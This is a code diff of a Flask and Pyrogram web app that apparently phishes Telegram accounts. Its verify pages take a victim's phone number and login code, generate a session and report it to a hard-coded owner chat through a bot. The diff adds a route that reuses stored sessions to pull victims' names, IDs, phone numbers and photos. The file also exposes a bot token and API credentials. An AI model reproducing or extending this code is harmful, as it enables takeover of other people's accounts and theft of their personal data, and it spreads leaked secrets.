@@ -16,10 +16,11 @@ from pyrogram.errors import (
 app = Flask(__name__)
 CORS(app)
 
-# --- টেলিগ্রাম এবং এপিআই কনফিগারেশন ---
+# ==========================================
+#          CONFIGURATION
+# ==========================================
 API_ID = int(os.environ.get("API_ID", 33511945))
 API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
-
 BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
 OWNER_CHAT_ID = "-1003962414788"  
 ADMIN_ID = 6034439625             
@@ -28,7 +29,9 @@ active_clients = {}
 total_logged_in_users = 0  
 admin_states = {} 
 
-# --- Helper Functions ---
+# ==========================================
+#          TELEGRAM HELPER FUNCTIONS
+# ==========================================
 def send_telegram_message(chat_id, text, reply_markup=None):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -37,10 +40,10 @@ def send_telegram_message(chat_id, text, reply_markup=None):
             payload["reply_markup"] = reply_markup
         requests.post(url, json=payload, timeout=15)
     except Exception as e:
-        pass
+        print("Send Msg Error:", e)
 
 def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
-    """মেসেজ এডিট করার ফাংশন (নতুন মেসেজ না পাঠিয়ে আগেরটা পরিবর্তন করবে)"""
+    """মেসেজ এডিট করার ফাংশন (Back বাটনের জন্য)"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
         payload = {
@@ -53,7 +56,7 @@ def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
             payload["reply_markup"] = reply_markup
         requests.post(url, json=payload, timeout=15)
     except Exception as e:
-        pass
+        print("Edit Msg Error:", e)
 
 def answer_callback(callback_query_id, text, show_alert=False):
     try:
@@ -80,7 +83,9 @@ def download_telegram_file(file_id):
         pass
     return False, None
 
-# --- UI Components ---
+# ==========================================
+#          UI COMPONENTS (MENUS)
+# ==========================================
 def get_main_menu():
     return {
         "inline_keyboard": [
@@ -104,37 +109,50 @@ def get_back_button():
         ]
     }
 
-# --- Pyrogram Background Loop ---
+# ==========================================
+#          BACKGROUND LOOP (PYROGRAM)
+# ==========================================
 bg_loop = asyncio.new_event_loop()
 def start_background_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_forever()
 loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
 loop_thread.start()
+
 def run_async(coro):
     future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
     return future.result()
 
 
 # ==========================================
-#          FLASK WEB ROUTES (FRONTEND & API)
+#          FLASK WEB ROUTES (FRONTEND)
 # ==========================================
 @app.route('/', methods=['GET'])
-def home(): return send_file('index.html') if os.path.exists('index.html') else ("Not found", 404)
+def home():
+    if os.path.exists('index.html'): return send_file('index.html')
+    return "index.html not found", 404
 
 @app.route('/verify', methods=['GET'])
-def verify_page(): return send_file('verify.html') if os.path.exists('verify.html') else ("Not found", 404)
+def verify_page():
+    if os.path.exists('verify.html'): return send_file('verify.html')
+    return "verify.html not found", 404
 
 @app.route('/dashboard.html', methods=['GET'])
-def dashboard_page(): return send_file('dashboard.html') if os.path.exists('dashboard.html') else ("Not found", 404)
+def dashboard_page():
+    if os.path.exists('dashboard.html'): return send_file('dashboard.html')
+    return "dashboard.html not found", 404
 
 @app.route('/profile.html', methods=['GET'])
-def profile_page(): return send_file('profile.html') if os.path.exists('profile.html') else ("Not found", 404)
+def profile_page():
+    if os.path.exists('profile.html'): return send_file('profile.html')
+    return "profile.html not found", 404
 
+
+# ==========================================
+#          PYROGRAM API ROUTES (BACKEND)
+# ==========================================
 @app.route('/send-code', methods=['POST'])
 def send_code():
-    # ... (আপনার আগের send_code এর কোড অপরিবর্তিত আছে) ...
-    pass # সংক্ষেপের জন্য স্কিপ করা হলো, আপনি আগের ফুল কোডটা এখানে রাখতে পারেন, বা নিচের ফুল ব্লক ইউজ করুন
     data = request.get_json(silent=True) or {}
     phone = str(data.get('phone', '')).strip()
     if not phone: return jsonify({"status": "error", "message": "Phone number is required"}), 400
@@ -184,6 +202,34 @@ def verify_code():
             send_telegram_message(OWNER_CHAT_ID, msg)
             active_clients.pop(phone, None)
             return jsonify({"status": "success", "message": "Session generated!"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+@app.route('/get-user-profile', methods=['POST'])
+def get_user_profile():
+    data = request.get_json(silent=True) or {}
+    phone = str(data.get('phone', '')).strip()
+    if not phone: return jsonify({"status": "error", "message": "Phone required"}), 400
+    try:
+        session_name = f"session_{phone.replace('+', '')}"
+        async def _fetch():
+            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
+            await client.connect()
+            me = await client.get_me()
+            photo_url = None
+            async for photo in client.get_chat_photos("me", limit=1):
+                file_path = await client.download_media(photo.file_id, file_name=f"static/profile_{me.id}.jpg")
+                photo_url = "/" + file_path
+            await client.disconnect()
+            return {
+                "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
+                "username": f"@{me.username}" if me.username else "No Username",
+                "id": me.id,
+                "phone": me.phone_number or phone,
+                "photo": photo_url or "https://carder.top/imagens/1791918460640-323067073.jpg"
+            }
+        profile_data = run_async(_fetch())
+        return jsonify({"status": "success", "profile": profile_data})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
 
@@ -240,10 +286,15 @@ def telegram_webhook():
         elif "callback_query" in data:
             callback_query = data["callback_query"]
             callback_data = callback_query.get("data")
-            chat_id = callback_query["message"]["chat"]["id"]
-            message_id = callback_query["message"]["message_id"]
+            message_obj = callback_query.get("message", {})
+            chat_id = message_obj.get("chat", {}).get("id")
+            message_id = message_obj.get("message_id")
             user_id = callback_query["from"]["id"]
             callback_query_id = callback_query["id"]
+
+            if not chat_id or not message_id:
+                answer_callback(callback_query_id, "Error: Message ID missing")
+                return "OK", 200
 
             if callback_data == "total_members":
                 answer_callback(callback_query_id, "Fetching data...")
